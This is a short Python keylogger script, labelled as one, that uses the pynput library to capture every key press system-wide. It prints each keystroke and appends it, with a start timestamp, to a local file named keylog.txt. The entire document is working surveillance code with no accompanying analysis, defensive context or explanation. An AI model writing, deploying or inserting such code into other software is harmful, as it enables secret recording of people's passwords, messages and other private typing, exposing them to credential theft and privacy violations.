
# Keylogger By Kalmux

from pynput import keyboard
from datetime import datetime

def write_log(data):
    with open("keylog.txt", 'a') as log:
        try:
            log.write(data)
        except Exception as e:
            print(f"An Error Occurred: {e}")


def keylog(key):
    key = str(key)
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key.startswith('Key'):
        key = f'  [{key}]  ' 
    
    print(key)
    write_log(key)


def listner():
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    write_log(f"\n\nLogging started at {current_time}\n")
    
    with keyboard.Listener(on_press=keylog) as listener:
        print("Keylogging started...")
        listener.join()


listner()